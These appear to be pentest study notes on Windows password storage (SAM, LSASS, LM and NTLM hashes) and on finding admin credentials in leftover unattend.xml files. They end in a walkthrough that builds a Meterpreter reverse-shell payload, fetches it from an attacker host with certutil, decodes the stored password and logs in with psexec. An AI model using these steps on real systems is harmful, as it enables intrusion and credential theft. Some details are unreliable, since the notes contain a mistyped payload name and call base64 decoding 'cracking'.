Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database

Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.

Authentication and verification of user creds is facilitated by the Local Security Authority (LSA)

Windows versions up to Windows Server 2003 utilize two different types of hashes:
  LM
  NTLM

Windows disables LM hashing and utilizes NTLM hashing from Windows Vista and onwards

SAM is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.

The SAM database file cannot be copied while the OS is running.

The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.

In modern versions of Windows, the SAM database is encrypted with a syskey.

***Elevated/Admin privs are required in order to access and interact with the LSASS process***

------------------------------------------------------LM (LanMan)-------------------------------------------------------------------------------------------

LM is the default hashing algorithm that was implemented in Windows OS priot to NT 4.0

The protocol is used to has user pass and the hashing process can be broken down into the following steps:
  The pass is broken into two seven-character chunks
  All characters are then converted into uppercase
  Each chunk is then hashed seperately with the DES algorithm
 
LM hashing is generally considered to be a weak protocol and can easily be cracked. primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.

--------------------------------------------------NTLM (NTHash)---------------------------------------------------------------------------------------------

NTLM is a collection of auth protocols that are utilized in Windows to facilitate auth between computers. The auth process involves using a valid user and pass to auth successfully.

From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.

When a user account is created it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.

NTLM improves upon LM in the following ways:
  Does not split the hash in to two chunks
  Case sensitive
  Allows the use of symbols and unicode characters
 
----------------------------------------------------------Searching for Passwords in Windows Config Files----------------------------------------------------

Windows can automate a variety of repetitive tasks, such as the mass rollout or install of Windows on many systems.
This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass install/deployment of Windows on systems.

This tool utilizes config files that contain specific configs and user account creds, specifically the Admin account password.

If the Unattended Windows Setup config files are left on the target system after install, they can reveal user account creds that can be used by attackers to auth with Windows target legitimately

The Unattended Windows Setup utility will typically utilize one of the following config files that contain user account and system config info:
  C:\Windows\Panther\Unattend.xml
  C:\Windows\Panther\Autounattend.xml
  
As a security precaution, the passwords stored in the Unattended Windows Setup config may be encoded in base64

------------------------Actual Searching------------------------------------

**If you haven't already, get a meterpreter session on the target**
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<listener ip> LPORT=<listener port> > payload.exe

python -m SimpleHTTPServer 80

certutil -urlcache -f http://<attacker IP/payload.exe payload.exe (this downloads the file you're serving on your machine, from the target machine)

**from here you can shut down your serving web server and start msfconsole**

service postgresql start && msfconsole
use multi/handler
set payload windows/x65/meterpreter/reverse_tcp
**set settings and run to get meterpreter session*
sysinfo
search -f Unattend.xml (this may fail)
cd C:\\
cd Windows
cd Panther
dir
download unattend.xml
cat unattend.xml (find <AutoLogon> and the <Value> under this section)

vim and copy the password over
base64 -d password.txt (this will crack it)
psexec.py Administrator@<targetIP> (PSexec is a light-weight telnet-replacement that lets you execute processes on other systems)
**try the password**

